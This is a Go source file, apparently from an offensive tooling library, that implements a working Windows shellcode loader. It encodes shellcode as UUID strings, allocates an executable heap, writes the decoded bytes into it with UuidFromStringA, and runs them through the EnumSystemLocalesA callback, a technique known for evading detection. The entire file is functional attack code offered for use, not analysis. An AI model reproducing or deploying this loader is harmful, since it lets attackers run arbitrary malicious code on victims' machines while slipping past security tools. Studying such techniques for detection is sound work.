package loader

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"variant/xwindows"

	"github.com/google/uuid"
	"golang.org/x/sys/windows"
)

func UUIDFromString(shellcode []byte) error {

	uuids, err := ShellcodeToUUID(shellcode)
	if err != nil {
		return fmt.Errorf("error loading UUIDs from shellcode: %w", err)
	}

	// Create the heap
	// HEAP_CREATE_ENABLE_EXECUTE = 0x00040000
	heapAddr, hcErr := xwindows.HeapCreate(0x00040000, 0, 0)
	if heapAddr == 0 {
		return fmt.Errorf("HeapCreate failed: %w", hcErr)
	}

	// Allocate the heap
	addr, haErr := xwindows.HeapAlloc(windows.Handle(heapAddr), 0, 0x00100000)
	if addr == 0 {
		return fmt.Errorf("HeapAlloc failed: %w", haErr)
	}

	addrPtr := addr
	for _, id := range uuids {
		// Must be an RPC_CSTR which is null terminated
		u := append([]byte(id), 0)

		// Only need to pass a pointer to the first character in the null-terminated string representation of the UUID
		rpcStatus, _ := xwindows.UuidFromStringA(&u[0], addrPtr)
		// RPC_S_OK = 0
		if rpcStatus != 0 {
			return fmt.Errorf("UuidFromStringA failed: %v", rpcStatus)
		}

		addrPtr += 16
	}

	// Execute Shellcode
	ret, esErr := xwindows.EnumSystemLocalesA(addr, 0)
	if ret == 0 {
		return fmt.Errorf("EnumSystemLocalesA failed: %w", esErr)
	}

	return nil
}

// ShellcodeToUUID takes in shellcode bytes, pads it to 16 bytes, breaks them into 16 byte chunks (size of a UUID),
// converts the first eight bytes into Little Endian format, creates a UUID from the bytes, and returns an array of UUIDs
func ShellcodeToUUID(shellcode []byte) ([]string, error) {
	// Pad shellcode to 16 bytes, the size of a UUID
	if 16-len(shellcode)%16 < 16 {
		pad := bytes.Repeat([]byte{byte(0x90)}, 16-len(shellcode)%16)
		shellcode = append(shellcode, pad...)
	}

	var uuids []string

	for i := 0; i < len(shellcode); i += 16 {
		var uuidBytes []byte

		// This seems an unnecessary or overcomplicated way to do this

		// Add first 4 bytes
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, binary.BigEndian.Uint32(shellcode[i:i+4]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+4:i+6]))
		uuidBytes = append(uuidBytes, buf...)

		// Add next 2 bytes
		buf = make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, binary.BigEndian.Uint16(shellcode[i+6:i+8]))
		uuidBytes = append(uuidBytes, buf...)

		// Add remaining
		uuidBytes = append(uuidBytes, shellcode[i+8:i+16]...)

		u, err := uuid.FromBytes(uuidBytes)
		if err != nil {
			return nil, fmt.Errorf("there was an error converting bytes into a UUID:\n%s", err)
		}

		uuids = append(uuids, u.String())
	}
	return uuids, nil
}
